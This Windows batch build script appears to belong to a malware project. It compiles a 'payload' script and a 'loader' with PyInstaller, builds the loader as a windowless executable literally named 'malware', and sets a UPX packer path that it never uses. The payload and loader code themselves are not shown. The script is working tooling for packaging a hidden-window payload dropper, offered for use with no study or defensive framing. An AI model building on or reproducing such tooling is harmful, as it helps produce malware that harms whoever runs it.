@echo off
title Compiling...

if "%1" == "payload" (
pyinstaller --hiddenimport win32timezone --onefile --name payload payload.py
del payload.spec
)

if "%1" == "loader" (
set source_filename=loader
set destination_filename=malware
set upx_dir=C:\UPX

python update_payload.py
pyinstaller --clean --onefile --noconsole --name %destination_filename% %source_filename%.py

del %destination_filename%.spec
)

if "%1" == "project" (
compile payload
cls
compile loader
cls
echo Project compiled!
)

if "%1" == "server" (
echo "Server compiled!"
)

:: rmdir /s /q build
title cmd.exe
